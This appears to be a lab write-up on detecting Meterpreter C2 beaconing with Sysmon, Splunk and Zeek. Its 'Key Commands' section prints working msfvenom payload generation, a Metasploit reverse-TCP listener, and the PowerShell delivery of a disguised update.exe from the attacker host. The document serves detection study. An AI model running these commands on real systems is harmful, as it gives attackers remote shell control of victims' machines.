# A07 — C2 Beaconing (Meterpreter Reverse TCP)

## Overview

This scenario simulates post-exploitation Command and Control (C2) beaconing. After establishing a Meterpreter reverse shell on Windows 10, the implant periodically contacts the Kali C2 server at regular intervals. Detection is achieved through three independent lenses: Sysmon host-based process correlation, Splunk statistical beaconing analysis (standard deviation), and Zeek network-based connection pattern analysis.

**OWASP Category:** A08:2021 — Software and Data Integrity Failures  
**MITRE ATT&CK:** T1059.001, T1105, T1071.001, T1095, T1547.001  
**Lab Date:** 5 June 2026  
**Victim:** Windows 10 — 10.10.10.10  
**Attacker / C2:** Kali Linux — 10.10.10.5  
**SIEM:** Splunk Enterprise — Sysmon index  
**Network Detection:** Zeek 8.0.8 + ELK 8.19.15  
**NIST:** DE.CM-1, DE.CM-7, RS.AN-1  
**ISO 27001:** A.8.15, A.8.16, A.5.25  

---

## What is C2 Beaconing?

A C2 implant periodically contacts its command server to receive instructions. The defining detection characteristic is **regularity** — automated beaconing produces statistically uniform connection intervals. Human-generated traffic is irregular (stdev > 2). Automated beaconing without jitter produces stdev ≈ 0.

---

## Attack Chain

| Phase | Action | MITRE | Tool |
|-------|--------|-------|------|
| 1 | Generate Meterpreter payload | T1105 | msfvenom |
| 2 | Start C2 listener | T1071.001 | Metasploit multi/handler |
| 3 | Deliver payload via HTTP | T1105 | Python HTTP server |
| 4 | Execute payload on victim | T1059.001 | PowerShell |
| 5 | Meterpreter session established | T1095 | Meterpreter |
| 6 | Beacon loop — 10 check-ins at 60s intervals | T1071.001 | bash script |
| 7 | Capture PCAP | — | tcpdump |
| 8 | Zeek analysis | — | Zeek 8.0.8 |

---

## Key Commands

```bash
# Payload generation (Kali)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=4444 -f exe -o /tmp/update.exe

# C2 listener (Kali — Metasploit)
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.10.5
set LPORT 4444
set ExitOnSession false
run

# Payload delivery (Kali — HTTP server)
cd /tmp && python3 -m http.server 8080

# Payload download (Windows 10 — PowerShell)
Invoke-WebRequest -Uri http://10.10.10.5:8080/update.exe -OutFile C:\Users\shank\Downloads\update.exe

# Beacon loop (Kali)
for i in $(seq 1 10); do
    msfconsole -q -x "sessions -i 1; sysinfo; background; exit"
    sleep 60
done

# PCAP capture (Kali)
sudo tcpdump -i eth0 host 10.10.10.10 and port 4444 -w /tmp/scenario07_c2_beacon.pcap

# Zeek analysis (Ubuntu ELK)
zeek -C -r scenario07_c2_beacon.pcap LogAscii::use_json=T Log::default_logdir=./scenario07
```

---

## Detection — Splunk

### Primary: EID 3 Network Connection to Port 4444

```spl
index=sysmon EventCode=3 DestinationPort=4444
| table _time, Image, SourceIp, DestinationIp, DestinationPort, ProcessId
```

### Full Correlation: Process Chain + Beaconing Pattern

```spl
index=sysmon EventCode=3 DestinationPort=4444
| rename ProcessId as pid
| join pid
    [search index=sysmon EventCode=1
    | rename ProcessId as pid
    | fields pid, Image, CommandLine, ParentImage]
| where NOT match(Image, "(?i)splunk")
| bin _time span=1m
| stats count by _time, Image, CommandLine, ParentImage, DestinationIp, DestinationPort
| eventstats stdev(count) as stdev, avg(count) as avg by DestinationIp
| eval risk_score=case(
    DestinationPort=4444 AND stdev<1, "CRITICAL",
    DestinationPort=4444, "HIGH",
    true(), "MEDIUM")
| table _time, Image, CommandLine, ParentImage, DestinationIp, DestinationPort, count, avg, stdev, risk_score
```

**Result:** `update.exe` spawned by `powershell.exe` → `10.10.10.5:4444` → stdev=0 → **CRITICAL**

**Saved Alert:** `C2 Beaconing - Process Correlation - CRITICAL` — Scheduled every 15 minutes

---

## Detection — Zeek + Kibana

**PCAP:** 104 packets → 51 conn.log entries  
**Kibana query:** `id.resp_h: "10.10.10.5"` → **150 documents**

| Field | Value | Significance |
|-------|-------|-------------|
| id.resp_p | 4444 | Non-standard C2 port |
| conn_state | REJ | Implant persisting despite C2 offline |
| duration | ~0.000025s | No data exchanged — keepalive only |
| orig_bytes | 0 | Zero payload |
| resp_bytes | 0 | Zero response |
| history | Sr | SYN+RST — repeated failed reconnect |

**Kibana saved search:** `C2 Beaconing - Zeek conn.log - Port 4444 Periodic Connections`

---

## Splunk vs ELK — What Each Saw

| | Splunk + Sysmon | Zeek + ELK |
|--|----------------|-----------|
| Process name | update.exe ✅ | ❌ |
| Parent process | powershell.exe ✅ | ❌ |
| Connection volume | 2 EID 3 events | 150 conn.log entries ✅ |
| Bytes transferred | ❌ | 0/0 bytes ✅ |
| Connection state | ❌ | REJ — persistent retry ✅ |
| Real-time alert | ✅ Splunk alert | ✅ Kibana saved search |

---

## Key Findings

- **stdev=0** is the definitive beaconing signature — join correlation with process chain gives zero false positives
- **150 Zeek connections vs 2 Sysmon events** — Zeek reveals the full beaconing volume Sysmon misses
- **conn_state=REJ** — implant retried 150 times after C2 went offline — C2 persistence behaviour unique to automated malware
- **update.exe via powershell.exe** — masquerading (T1036) + T1059.001 combined — high-confidence indicator

## Detection Gaps

- Jitter evasion: C2 with random sleep evades stdev<0.5 — tune to stdev<2
- HTTPS C2 (port 443): blends with normal traffic — requires TLS inspection / Zeek ssl.log
- DNS C2: tunnelled through DNS — requires Zeek dns.log anomaly detection

## CVSS v4.0 Score

**Base Score: 9.1 (Critical)**
- Attack Vector: Network
- Privileges Required: Low (requires initial access)
- Confidentiality: High
- Integrity: High
- Availability: High

---

## Files

- `detections/scenario07_beaconing.spl` — All Splunk detection queries
- `findings/scenario07_findings.md` — Zeek conn.log analysis and IOC summary
- `Scenario07_C2Beaconing_Playbook.docx` — Full playbook with NIST/MITRE/ISO mapping (local)
